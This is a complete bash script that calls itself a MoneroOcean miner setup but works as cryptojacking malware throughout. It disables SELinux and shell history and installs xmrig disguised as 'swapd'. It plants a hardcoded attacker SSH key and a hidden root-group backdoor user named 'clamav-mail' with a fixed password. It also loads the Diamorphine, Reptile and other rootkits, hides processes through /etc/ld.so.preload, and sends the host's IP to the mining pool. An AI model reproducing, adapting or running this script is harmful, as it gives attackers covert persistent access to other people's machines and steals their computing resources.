#!/bin/bash

# Function to check if a directory exists before navigating to it
check_directory() {
    if [ -d "$1" ]; then
        cd "$1" || return 1
        return 0
    else
        echo "Directory $1 does not exist, skipping."
        return 1
    fi
}

# Function to detect package manager and run appropriate commands
detect_package_manager() {
    if command -v apt >/dev/null 2>&1; then
        echo "Detected apt package manager"
        PKG_MANAGER="apt"
    elif command -v yum >/dev/null 2>&1; then
        echo "Detected yum package manager"
        PKG_MANAGER="yum"
    elif command -v zypper >/dev/null 2>&1; then
        echo "Detected zypper package manager"
        PKG_MANAGER="zypper"
    else
        echo "No supported package manager found"
        PKG_MANAGER="none"
    fi
}

# Function to safely install packages
install_packages() {
    local packages="$1"
    
    case $PKG_MANAGER in
        apt)
            NEEDRESTART_MODE=a apt-get install -y $packages
            ;;
        yum)
            yum install -y $packages
            ;;
        zypper)
            zypper install -y $packages
            ;;
        *)
            echo "Cannot install packages: no supported package manager found"
            return 1
            ;;
    esac
}

# Add resilient command execution
run_resilient() {
    for i in {1..3}; do
        "$@" && return 0
        echo "[RETRY $i/3] Failed: $@"
        sleep $((RANDOM % 5 + 1))
    done
    echo "[WARNING] Ultimate failure: $@ - continuing anyway"
    return 0
}

# Safely remove files with chattr protection
remove_protected_dir() {
    local dir="$1"
    if [ -d "$dir" ]; then
        safe_run chattr -i "$dir" 2>/dev/null
        safe_run chattr -i "$dir"/* 2>/dev/null
        safe_run chattr -i "$dir/.swapd" 2>/dev/null
        safe_run rm -rf "$dir"
    fi
}

# Command timeout with logging
safe_run() {
    local timeout=25
    echo "[SAFE_RUN] $@"
    timeout $timeout "$@"
    local status=$?
    if [ $status -eq 124 ]; then
        echo "[TIMEOUT] Command failed: $@"
        return 1
    fi
    return $status
}

# Initialize package manager detection
detect_package_manager

sudo setenforce 0 2>/dev/null || echo "SELinux not available"

# Fix repository issues based on detected package manager
if [ "$PKG_MANAGER" = "yum" ]; then
    echo "Checking and fixing YUM repositories if needed"
    # Only run if CentOS/RHEL repos exist and need fixing
    if [ -d "/etc/yum.repos.d" ] && [ -f "/etc/yum.repos.d/CentOS-Base.repo" ]; then
        echo "Fixing CentOS/RHEL repositories"
        sudo curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
        sudo yum clean all && sudo yum makecache
    fi
    
    # Only fix MariaDB repo if it exists and needs fixing
    if [ -f "/etc/yum.repos.d/mariadb.repo" ]; then
        echo "Fixing MariaDB repository"
        sudo rm -f /etc/yum.repos.d/mariadb.repo
        sudo tee /etc/yum.repos.d/mariadb.repo <<'EOF'
[mariadb]
name = MariaDB
baseurl = https://mirror.mariadb.org/yum/10.11/rhel7-amd64
gpgkey=https://mirror.mariadb.org/yum/RPM-GPG-KEY-MariaDB
gpgcheck=1
EOF
    fi
fi

# ====== MODIFIED EMERGENCY HANDLING ======
# Create a safer emergency pipe mechanism
if [ -e /tmp/emergency_pipe ]; then
    rm -f /tmp/emergency_pipe
fi
mkfifo /tmp/emergency_pipe

# Replace the existing emergency pipe section with:
(
    sleep 30
    echo "[WARNING] Emergency timer triggered - continuing anyway" >&2
    # Instead of exiting, just kill potential problematic processes
    pkill -f "sleep \$timeout" 2>/dev/null
    rm -f /tmp/emergency_pipe
) &

# Keep SSH alive
(
    while true; do
        echo "[SSH KEEPALIVE] $(date)"
        sleep 10
    done
) &

# Set up safer trap handling
trap '
    echo "CLEANING UP..."; 
    kill %1 %2 2>/dev/null;
    rm -f /tmp/emergency_pipe;
    exit 0
' SIGTERM SIGINT SIGHUP

# ======== SSH PRESERVATION ========
echo "[*] Ensuring SSH access is preserved"
systemctl restart sshd
if [ -f "/etc/ssh/sshd_config" ]; then
    # Only add if not already present
    if ! grep -q "ClientAliveInterval" /etc/ssh/sshd_config; then
        echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
    fi
    if ! grep -q "ClientAliveCountMax" /etc/ssh/sshd_config; then
        echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
    fi
    systemctl reload sshd
else
    echo "WARNING: sshd_config not found, cannot configure SSH keepalive"
fi

# Timeout and self-healing execution
timeout_run() {
    local timeout=5  # seconds
    local cmd="$@"
    
    # Run command in background
    $cmd &
    local pid=$!
    
    # Start timeout killer
    (sleep $timeout && kill -9 $pid 2>/dev/null) &
    local killer=$!
    
    # Wait for command completion
    wait $pid 2>/dev/null
    kill -9 $killer 2>/dev/null  # Cancel killer if command finished
}

# Secure history handling
unset HISTFILE
export HISTFILE=/dev/null

# Safely stop and disable services
systemctl stop gdm2 2>/dev/null || echo "gdm2 service not found"
systemctl disable gdm2 --now 2>/dev/null || echo "gdm2 service not found"
systemctl stop swapd 2>/dev/null || echo "swapd service not found"
systemctl disable swapd --now 2>/dev/null || echo "swapd service not found"

# Safely kill processes
safe_run pkill -f "swapd" || echo "No swapd processes found"
safe_run pkill -f "kswapd0" || echo "No kswapd0 processes found"

# Clean up various directories
remove_protected_dir ".swapd"
remove_protected_dir ".gdm"
remove_protected_dir ".gdm2_manual"
remove_protected_dir ".gdm2_manual_*"
remove_protected_dir ".gdm2"

# Remove service files
if [ -f "/etc/systemd/system/swapd.service" ]; then
    safe_run chattr -i /etc/systemd/system/swapd.service
    safe_run rm -f /etc/systemd/system/swapd.service
fi

if [ -f "/etc/systemd/system/gdm2.service" ]; then
    safe_run chattr -i /etc/systemd/system/gdm2.service
    safe_run rm -f /etc/systemd/system/gdm2.service
fi

# Safely navigate to directories and clean up rootkits
if check_directory "/tmp"; then
    if check_directory ".ICE-unix" 2>/dev/null; then
        if check_directory ".X11-unix" 2>/dev/null; then
            remove_protected_dir "Reptile"
            remove_protected_dir "Nuk3Gh0st"
        fi
        cd /tmp
    elif check_directory ".X11-unix" 2>/dev/null; then
        remove_protected_dir "Reptile"
        remove_protected_dir "Nuk3Gh0st"
        cd /tmp
    fi
fi

# Install curl if needed
if ! command -v curl >/dev/null 2>&1; then
    install_packages "curl"
fi

VERSION=2.11

# Printing greetings
echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not advised to run this script under root"
fi

# Command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

echo "[*] Checking prerequisites..."

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_mo_4_r00t_with_processhide_fixed.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

# Check for required utilities
for cmd in curl lscpu; do
  if ! command -v $cmd >/dev/null 2>&1; then
    echo "WARNING: This script requires \"$cmd\" utility to work correctly"
    install_packages $cmd
  fi
done

echo "[*] Calculating port..."
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null 2>&1; then
    if [ "$EXP_MONERO_HASHRATE" -lt "1000" ]; then
      echo "1000"
      return
    fi
    if [ "$EXP_MONERO_HASHRATE" -lt "2000" ]; then
      echo "2000"
      return
    fi
    if [ "$EXP_MONERO_HASHRATE" -lt "4000" ]; then
      echo "4000"
      return
    fi
    if [ "$EXP_MONERO_HASHRATE" -lt "8000" ]; then
      echo "8000"
      return
    fi
    if [ "$EXP_MONERO_HASHRATE" -lt "16000" ]; then
      echo "16000"
      return
    fi
    if [ "$EXP_MONERO_HASHRATE" -lt "32000" ]; then
      echo "32000"
      return
    fi
    if [ "$EXP_MONERO_HASHRATE" -lt "64000" ]; then
      echo "64000"
      return
    fi
    if [ "$EXP_MONERO_HASHRATE" -lt "128000" ]; then
      echo "128000"
      return
    fi
    echo "128000"
    return
  fi
  local n=$1
  echo "x=l($n)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 / 1000 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 9000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "9001" -o "$PORT" -gt "9900" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi

echo "[*] Mining pool port: $PORT"

# Downloading and installing miner
echo "[*] Removing previous miner (if exists)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop swapd.service 2>/dev/null
  sudo systemctl disable swapd.service 2>/dev/null
fi
killall -9 swapd 2>/dev/null
killall -9 xmrig 2>/dev/null
rm -rf $HOME/.swapd

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download miner"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.swapd"
[ -d $HOME/.swapd ] || mkdir $HOME/.swapd
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.swapd; then
  echo "ERROR: Can't unpack miner"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if stock version of monero-ocean/xmrig is supported on this CPU"
STOCK_VERSION_SUPPORTED=0
if $HOME/.swapd/xmrig --help >/dev/null 2>&1; then
  STOCK_VERSION_SUPPORTED=1
fi

if [ "$STOCK_VERSION_SUPPORTED" -eq "0" ]; then
  echo "[*] Standard version of monero-ocean/xmrig is not supported on this CPU"
  echo "[*] Downloading low-level version of xmrig to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz" -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download low-level miner"
    exit 1
  fi
  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.swapd"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.swapd --strip=1; then
    echo "ERROR: Can't unpack low-level miner"
    exit 1
  fi
  rm /tmp/xmrig.tar.gz
fi

mv $HOME/.swapd/xmrig $HOME/.swapd/swapd

echo "[*] Preparing swapd config"
cat >$HOME/.swapd/config.json <<EOL
{
    "autosave": true,
    "donate-level": 1,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "max-threads-hint": 100
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "gulf.moneroocean.stream:$PORT",
            "user": "$WALLET",
            "pass": "",
            "keepalive": true,
            "nicehash": false
        }
    ]
}
EOL

cat >$HOME/.swapd/config_background.json <<EOL
{
    "autosave": true,
    "background": true,
    "donate-level": 1,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "max-threads-hint": 100
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "gulf.moneroocean.stream:$PORT",
            "user": "$WALLET",
            "pass": "",
            "keepalive": true,
            "nicehash": false
        }
    ]
}
EOL

# Adding password to config
PASS=$(sh -c "(curl -4 ip.sb)" 2>/dev/null)
if [ "$PASS" == "localhost" ]; then
  PASS=$(ip route get 1 | awk '{print $NF;exit}')
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config_background.json

echo "[*] Generating ssh key on server"
mkdir -p ~/.ssh && chmod 700 ~/.ssh
if ! grep -q "AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN" ~/.ssh/authorized_keys 2>/dev/null; then
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >>~/.ssh/authorized_keys
fi
chmod 600 ~/.ssh/authorized_keys 2>/dev/null

# Create backdoor user with proper password hashing
if [ $(id -u) = 0 ]; then
    PASSWORD='1!taugenichts'
    HASH_METHOD=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}' || echo "SHA512")
    
    if [ "$HASH_METHOD" = "SHA512" ]; then
        PASSWORD_HASH=$(openssl passwd -6 -salt $(openssl rand -base64 3) "$PASSWORD")
    else
        PASSWORD_HASH=$(openssl passwd -1 -salt $(openssl rand -base64 3) "$PASSWORD")
    fi
    
    # Remove existing user if present
    if id -u clamav-mail >/dev/null 2>&1; then
        sudo userdel --remove clamav-mail 2>/dev/null
    fi
    
    # Create necessary groups
    if ! grep -q '^sudo:' /etc/group; then
        sudo groupadd sudo 2>/dev/null
    fi
    if ! grep -q '^clamav-mail:' /etc/group; then
        sudo groupadd clamav-mail 2>/dev/null
    fi
    
    # Create user
    sudo useradd -u 455 -G root,sudo -g clamav-mail -M -o -s /bin/bash clamav-mail 2>/dev/null
    sudo usermod -p "$PASSWORD_HASH" clamav-mail 2>/dev/null
    
    # Reorder passwd and shadow files to hide user in middle
    awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd
    awk '{lines[NR]=$0} END{last=lines[NR]; delete lines[NR]; n=NR-1; m=int(n/2+1); for(i=1;i<m;i++) print lines[i]; print last; for(i=m;i<=n;i++) print lines[i]}' /etc/shadow > /tmp/shadow && sudo mv /tmp/shadow /etc/shadow
fi

echo "[*] Detecting distribution and installing linux headers for kernel $(uname -r)"

if command -v apt >/dev/null 2>&1; then
    # Debian / Ubuntu
    sudo apt update
    NEEDRESTART_MODE=a sudo apt install -y build-essential linux-headers-$(uname -r) 2>/dev/null || echo "Warning: Could not install all packages"
elif command -v dnf >/dev/null 2>&1; then
    # Fedora / RHEL 8+ / CentOS Stream
    sudo dnf install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc 2>/dev/null || echo "Warning: Could not install all packages"
elif command -v yum >/dev/null 2>&1; then
    # RHEL 7 / CentOS 7
    sudo yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc 2>/dev/null || echo "Warning: Could not install all packages"
elif command -v zypper >/dev/null 2>&1; then
    # openSUSE / SLE
    sudo zypper install -y kernel-devel kernel-default-devel gcc make 2>/dev/null || echo "Warning: Could not install all packages"
else
    echo "Unsupported distribution. Skipping kernel headers installation."
fi

echo "[*] Done! Kernel headers installation attempted."

# CPU Optimization Function
optimize_func() {
  echo "Starting CPU optimization"
  
  # MSR module and tools
  if ! lsmod | grep -q msr; then
    echo "Loading MSR module"
    modprobe msr 2>/dev/null || echo "Failed to load MSR module"
  fi
  
  # Install msr-tools if needed
  if ! command -v wrmsr >/dev/null 2>&1; then
    echo "Installing msr-tools"
    install_packages "msr-tools"
  fi
  
  # Apply MSR settings based on CPU type
  if grep "AMD" /proc/cpuinfo >/dev/null; then
    echo "Detected AMD CPU"
    # Check for Zen3 or newer
    if grep -E "model name.*: AMD.*EPYC 7(4|5|6|7|8|9)" /proc/cpuinfo >/dev/null || \
       grep -E "model name.*: AMD Ryzen.*(5|7|9) (5|6|7|8|9)" /proc/cpuinfo >/dev/null; then
      if lscpu | grep -q "Vendor ID:.*AuthenticAMD" && lscpu | grep -q "Model:.*25"; then
        echo "Detected Zen3 CPU"
        wrmsr -a 0xc0011020 0x4480000000000 2>/dev/null || echo "Failed to set MSR 0xc0011020"
        wrmsr -a 0xc0011021 0x1c000200000040 2>/dev/null || echo "Failed to set MSR 0xc0011021"
        wrmsr -a 0xc0011022 0xc000000401500000 2>/dev/null || echo "Failed to set MSR 0xc0011022"
        wrmsr -a 0xc001102b 0x2000cc14 2>/dev/null || echo "Failed to set MSR 0xc001102b"
        echo "MSR register values for Zen3 applied"
      fi
    else
      echo "Detected Zen1/Zen2 CPU"
      wrmsr -a 0xc0011020 0 2>/dev/null || echo "Failed to set MSR 0xc0011020"
      wrmsr -a 0xc0011021 0x40 2>/dev/null || echo "Failed to set MSR 0xc0011021"
      wrmsr -a 0xc0011022 0x1510000 2>/dev/null || echo "Failed to set MSR 0xc0011022"
      wrmsr -a 0xc001102b 0x2000cc16 2>/dev/null || echo "Failed to set MSR 0xc001102b"
      echo "MSR register values for Zen1/Zen2 applied"
    fi
  elif grep "Intel" /proc/cpuinfo >/dev/null; then
    echo "Detected Intel CPU"
    wrmsr -a 0x1a4 0xf 2>/dev/null || echo "Failed to set MSR 0x1a4"
    echo "MSR register values for Intel applied"
  else
    echo "No supported CPU detected for MSR optimization"
  fi
  
  # Hugepages setup
  echo "Setting up hugepages"
  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || echo "Failed to set hugepages"
  
  # Try to set 1GB pages if available
  if [ -d "/sys/devices/system/node" ]; then
    for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
      if [ -f "$i/hugepages/hugepages-1048576kB/nr_hugepages" ]; then
        echo 3 >"$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null || echo "Failed to set 1GB pages for $i"
      fi
    done
  fi
  
  echo "CPU optimization completed"
}

# Run CPU optimization if root
if [ $(id -u) = 0 ]; then
  echo "Running as root, performing CPU optimization"
  optimize_func
else
  echo "Not running as root, skipping CPU optimization"
  # Still try to set hugepages
  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || echo "Failed to set hugepages (requires root)"
fi

# Create emergency swap to prevent OOM
create_swap() {
  echo "[*] Checking if swap is needed"
  SWAP_SIZE=2G
  TOTAL_MEM=$(free -m | grep Mem | awk '{print $2}')
  
  if [ $TOTAL_MEM -lt 2000 ]; then
    echo "[*] System has less than 2GB RAM, creating $SWAP_SIZE swap file"
    
    # Check if swap already exists
    if free | grep -q Swap && [ "$(free | grep Swap | awk '{print $2}')" -gt 0 ]; then
      echo "Swap already exists, skipping creation"
      return
    fi
    
    # Create swap file
    if [ ! -f /swapfile ]; then
      echo "Creating swap file at /swapfile"
      sudo fallocate -l $SWAP_SIZE /swapfile 2>/dev/null || sudo dd if=/dev/zero of=/swapfile bs=1G count=2 2>/dev/null
      sudo chmod 600 /swapfile
      sudo mkswap /swapfile
      sudo swapon /swapfile
      
      # Make swap permanent
      if ! grep -q "/swapfile" /etc/fstab; then
        echo "/swapfile none swap sw 0 0" | sudo tee -a /etc/fstab
      fi
      
      echo "Swap file created and activated"
    else
      echo "Swap file already exists at /swapfile"
    fi
  else
    echo "System has sufficient RAM, no swap needed"
  fi
}

# Run swap creation if root
if [ $(id -u) = 0 ]; then
  create_swap
else
  echo "Not running as root, skipping swap creation"
fi

echo "[*] Installing Diamorphine rootkit"
if check_directory "/tmp"; then
    if check_directory ".ICE-unix" 2>/dev/null; then
        if check_directory ".X11-unix" 2>/dev/null; then
            ROOTKIT_DIR=$(pwd)
            remove_protected_dir "Diamorphine"
            remove_protected_dir "Reptile"
            
            # Install packages needed for compilation
            case $PKG_MANAGER in
                yum)
                    yum install -y linux-generic kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools 2>/dev/null
                    ;;
                apt)
                    NEEDRESTART_MODE=a apt-get update -y 2>/dev/null
                    NEEDRESTART_MODE=a apt-get reinstall kmod 2>/dev/null
                    NEEDRESTART_MODE=a apt-get install -y linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev 2>/dev/null
                    ;;
                zypper)
                    zypper update -y 2>/dev/null
                    zypper install -y linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev 2>/dev/null
                    ;;
            esac
            
            # Clone and build Diamorphine
            if git clone https://github.com/m0nad/Diamorphine 2>/dev/null; then
                cd Diamorphine/
                if make 2>/dev/null; then
                    insmod diamorphine.ko 2>/dev/null && echo "Diamorphine loaded successfully" || echo "Failed to load Diamorphine"
                    dmesg -C 2>/dev/null
                    kill -63 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null
                else
                    echo "Failed to compile Diamorphine"
                fi
                cd "$ROOTKIT_DIR"
            else
                echo "Failed to clone Diamorphine repository"
            fi
        fi
        cd /tmp
    fi
fi

echo "[*] Installing Reptile rootkit"
if check_directory "/tmp"; then
    if check_directory ".ICE-unix" 2>/dev/null; then
        if check_directory ".X11-unix" 2>/dev/null; then
            ROOTKIT_DIR=$(pwd)
            remove_protected_dir "Reptile"
            
            # Capture current SSH session for protection
            CURRENT_SSH_PID=$$
            CURRENT_SSH_PORT=$(ss -tnp 2>/dev/null | awk -v pid=$CURRENT_SSH_PID '/:22/ && $0 ~ pid {split($4,a,":"); print a[2]}')
            
            # Schedule connection watchdog
            (
                sleep 30
                if ! ping -c1 1.1.1.1 &>/dev/null; then
                    echo "Connection lost - triggering reboot"
                    /reptile/reptile_cmd unhide_all 2>/dev/null
                    reboot
                fi
            ) &
            
            # Install ncurses-devel for compilation
            case $PKG_MANAGER in
                yum)
                    yum install -y ncurses-devel 2>/dev/null
                    ;;
                apt)
                    NEEDRESTART_MODE=a apt-get install -y libncurses-dev 2>/dev/null
                    ;;
            esac
            
            # Clone Reptile
            if git clone https://gitee.com/fengzihk/Reptile.git --depth 1 2>/dev/null || \
               (curl -L https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip -o reptile.zip 2>/dev/null && \
                unzip -q reptile.zip 2>/dev/null && \
                mv Reptile-master Reptile 2>/dev/null); then
                
                cd Reptile 2>/dev/null
                
                # Apply critical kernel version patch
                sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' config.mk 2>/dev/null
                
                # Build with memory limits
                ulimit -v 1048576 2>/dev/null
                
                # Compile
                if make defconfig 2>/dev/null && make -j$(nproc) 2>/dev/null; then
                    if [ -f output/reptile.ko ]; then
                        sudo insmod output/reptile.ko 2>/dev/null && echo "Reptile loaded successfully" || echo "Failed to load Reptile"
                        
                        # Hide swapd process
                        kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null
                        
                        # Protect SSH sessions
                        SSHD_PIDS=$(pgrep -f "sshd:.*@" 2>/dev/null)
                        for pid in $SSHD_PIDS; do
                            echo 0 > /proc/$pid/oom_score_adj 2>/dev/null
                            /reptile/reptile_cmd show_pid $pid 2>/dev/null
                            /reptile/reptile_cmd show_file /proc/$pid/cmdline 2>/dev/null
                        done
                        
                        # Whitelist current SSH session
                        if [ ! -z "$CURRENT_SSH_PORT" ]; then
                            sudo /reptile/reptile_cmd show_port $CURRENT_SSH_PORT 2>/dev/null
                        fi
                        
                        # Enable rootkit features
                        /reptile/reptile_cmd hide 2>/dev/null
                        /reptile/reptile_cmd hide_port 22 2>/dev/null
                        /reptile/reptile_cmd hide_pid 1 2>/dev/null
                    else
                        echo "Reptile compilation failed - ko file not found"
                    fi
                else
                    echo "Failed to compile Reptile, trying legacy mode"
                    make clean 2>/dev/null
                    make CC=gcc-4.8 2>/dev/null
                fi
                
                cd "$ROOTKIT_DIR"
            else
                echo "Failed to obtain Reptile repository"
            fi
        fi
        cd /tmp
    fi
fi

echo "[*] Installing process hiding rootkit"
if check_directory "/tmp"; then
    if check_directory ".X11-unix" 2>/dev/null; then
        if git clone https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>/dev/null; then
            cd hiding-cryptominers-linux-rootkit/
            if make 2>/dev/null; then
                dmesg -C 2>/dev/null
                insmod rootkit.ko 2>/dev/null && echo "Process hider loaded successfully" || echo "Failed to load process hider"
                dmesg 2>/dev/null
                kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null
            else
                echo "Failed to compile process hider"
            fi
            cd /tmp
            rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null
        else
            echo "Failed to clone process hider repository"
        fi
    fi
fi

# Process hiding installation using LD_PRELOAD
install_process_hider() {
  echo "[*] Setting up LD_PRELOAD process hiding"
  
  # Create directory for process hider
  mkdir -p $HOME/.swapd/processhider
  
  # Download or create process hider source
  cat >$HOME/.swapd/processhider/processhider.c <<'EOL'
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char* process_to_filter = "swapd";

// Function pointer types for the hooked functions
typedef struct dirent* (*readdir_t)(DIR *dirp);
typedef int (*readdir_r_t)(DIR *dirp, struct dirent *entry, struct dirent **result);
typedef struct dirent64* (*readdir64_t)(DIR *dirp);
typedef int (*readdir64_r_t)(DIR *dirp, struct dirent64 *entry, struct dirent64 **result);

// Original function pointers
static readdir_t original_readdir = NULL;
static readdir_r_t original_readdir_r = NULL;
static readdir64_t original_readdir64 = NULL;
static readdir64_r_t original_readdir64_r = NULL;

// Initialize original function pointers
void init_original_functions() {
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    original_readdir_r = dlsym(RTLD_NEXT, "readdir_r");
    original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    original_readdir64_r = dlsym(RTLD_NEXT, "readdir64_r");
}

// Check if the process should be hidden
int should_hide(const char* name) {
    return (name && strstr(name, process_to_filter) != NULL);
}

// Hooked readdir
struct dirent* readdir(DIR *dirp) {
    if (!original_readdir) init_original_functions();
    
    struct dirent* dir;
    
    while (1) {
        dir = original_readdir(dirp);
        
        if (dir == NULL || !should_hide(dir->d_name)) {
            break;
        }
    }
    
    return dir;
}

// Hooked readdir_r
int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    if (!original_readdir_r) init_original_functions();
    
    int ret;
    
    do {
        ret = original_readdir_r(dirp, entry, result);
    } while (ret == 0 && *result != NULL && should_hide((*result)->d_name));
    
    return ret;
}

// Hooked readdir64
struct dirent64* readdir64(DIR *dirp) {
    if (!original_readdir64) init_original_functions();
    
    struct dirent64* dir;
    
    while (1) {
        dir = original_readdir64(dirp);
        
        if (dir == NULL || !should_hide(dir->d_name)) {
            break;
        }
    }
    
    return dir;
}

// Hooked readdir64_r
int readdir64_r(DIR *dirp, struct dirent64 *entry, struct dirent64 **result) {
    if (!original_readdir64_r) init_original_functions();
    
    int ret;
    
    do {
        ret = original_readdir64_r(dirp, entry, result);
    } while (ret == 0 && *result != NULL && should_hide((*result)->d_name));
    
    return ret;
}
EOL

  # Create Makefile
  cat >$HOME/.swapd/processhider/Makefile <<'EOL'
CC=gcc
CFLAGS=-Wall -fPIC -DPIC -g -O2
LDFLAGS=-shared -ldl

TARGET=libprocesshider.so

all: $(TARGET)

$(TARGET): processhider.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $<

install: $(TARGET)
	cp $(TARGET) /usr/local/lib/
	echo "/usr/local/lib/$(TARGET)" > /etc/ld.so.preload

clean:
	rm -f $(TARGET)
EOL

  # Compile process hider
  echo "[*] Compiling process hider"
  cd $HOME/.swapd/processhider
  make 2>/dev/null
  
  # Install process hider if root
  if [ $(id -u) = 0 ]; then
    echo "[*] Installing process hider system-wide"
    make install 2>/dev/null && echo "Process hider installed successfully" || echo "Failed to install process hider"
  else
    echo "[*] Not running as root, cannot install process hider system-wide"
    echo "To install process hider, run the following commands as root:"
    echo "cd $HOME/.swapd/processhider && sudo make install"
  fi
}

# Install LD_PRELOAD process hider
install_process_hider

# Start miner service
echo "[*] Starting miner"
systemctl status swapd 2>/dev/null || echo "Service not yet created"
systemctl start swapd 2>/dev/null || echo "Starting miner manually"

# Hide running processes using rootkit signals
kill -31 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null &
kill -31 $(pgrep -f -u root config_background.json 2>/dev/null) 2>/dev/null &
kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
